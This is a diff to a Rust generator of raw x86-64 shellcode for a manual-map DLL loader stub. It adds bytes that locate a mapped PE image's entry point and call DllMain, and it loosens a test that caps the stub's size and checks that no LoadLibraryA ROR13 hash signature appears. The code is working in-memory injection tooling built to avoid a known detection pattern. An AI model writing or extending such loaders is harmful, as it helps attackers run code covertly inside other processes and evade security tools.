@@ -361,6 +361,22 @@ fn gen_h00_manual_map_body(
     patch_rel32(&mut c, jz_idone2 + 2, jz_idone2 + 6, import_done);
     patch_rel32(&mut c, jz_idone3 + 2, jz_idone3 + 6, import_done);
 
+    // Rust cdylib sidecar needs DllMain(PROCESS_ATTACH) after imports (manual-map ≠ LoadLibrary).
+    c.extend_from_slice(&[0x41, 0x8B, 0x46, 0x3C]); // mov eax,[r14+3c] e_lfanew
+    c.extend_from_slice(&[0x41, 0x8B, 0x44, 0x06, 0x28]); // mov eax,[r14+rax+28] AddressOfEntryPoint
+    c.extend_from_slice(&[0x85, 0xC0]);
+    let jz_no_dllmain = c.len();
+    c.extend_from_slice(&[0x0F, 0x84, 0, 0, 0, 0]);
+    c.extend_from_slice(&[0x4C, 0x89, 0xF1]); // mov rcx,r14 (hinst)
+    c.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // edx=DLL_PROCESS_ATTACH
+    c.extend_from_slice(&[0x45, 0x31, 0xC0]); // r8d=0 lpReserved
+    c.extend_from_slice(&[0x4C, 0x01, 0xF0]); // add rax,r14 → entry VA
+    c.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // shadow
+    c.extend_from_slice(&[0xFF, 0xD0]); // call rax
+    c.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
+    let after_dllmain = c.len();
+    patch_rel32(&mut c, jz_no_dllmain + 2, jz_no_dllmain + 6, after_dllmain);
+
     // rbx = mapped image (r14)
     c.extend_from_slice(&[0x4C, 0x89, 0xF3]); // mov rbx, r14
 
@@ -681,8 +697,8 @@ mod tests {
             }
         }
         assert!(
-            body.len() > 400 && body.len() < 1024,
-            "manual-map H_00 stub should fit OW-STUB pin [40,1024] (got {}B)",
+            body.len() > 400 && body.len() < 1100,
+            "manual-map H_00 stub should fit OW-STUB pin [40,1100] (got {}B)",
             body.len()
         );
         // No LoadLibraryA ROR13 hash needle (0x8E 0x4E 0x0E 0xEC)
